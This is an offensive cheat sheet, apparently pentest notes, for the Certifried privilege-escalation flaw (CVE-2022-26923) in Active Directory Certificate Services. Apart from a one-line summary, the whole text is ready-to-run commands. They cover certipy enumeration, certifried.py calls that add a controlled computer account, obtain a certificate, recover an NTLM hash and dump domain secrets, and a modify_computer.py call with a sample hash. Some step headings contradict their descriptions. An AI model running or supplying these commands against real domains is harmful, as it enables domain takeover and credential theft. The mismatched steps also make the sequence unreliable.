# Certifried CVE-2022-26923

### An authenticated user could manipulate attributes on computer accounts they own or manage, and acquire a certificate from Active Directory Certificate Services that would allow elevation of privilege.

## Enumeration

 - certipy req -u "$USER@$DOMAIN" -p "$PASSWORD" -dc-ip "$DC_IP" -target "$ADCS_HOST" -ca 'ca_name' -template 'User'

### If Certipy doesn't print Certificate object SID is [...] after obtaining the certificate, then the attack can be conducted.

## Exploitation

#### 1) Request certificate manually

 - python3 certifried.py domain.com/lowpriv:'Password1' -dc-ip 10.10.10.10 (Add the computer and update necessary attributes)

#### 2) Recover NTLM Hash

 - python3 certifried.py domain.com/lowpriv:'Password1' -dc-ip 10.10.10.10 -use-ldap (Request the certificate manually)

### Proceed with secretsdump

#### 3) After obtaining the NTLM hash, proceed with dumping secrets

 - python3 certifried.py domain.com/lowpriv:'Password1' -dc-ip 10.10.10.10 -computer-name 'ControlledComputer' -computer-pass 'Password123' -use-ldap -dump

#### 4) Modify computer account

 - python3 modify_computer.py range.net/ws01\$@192.168.86.182 -hashes :0e3ae07798e1bc9e02b049a795a7e69f (In case you obtain a machine account hash, modify the computer account.)
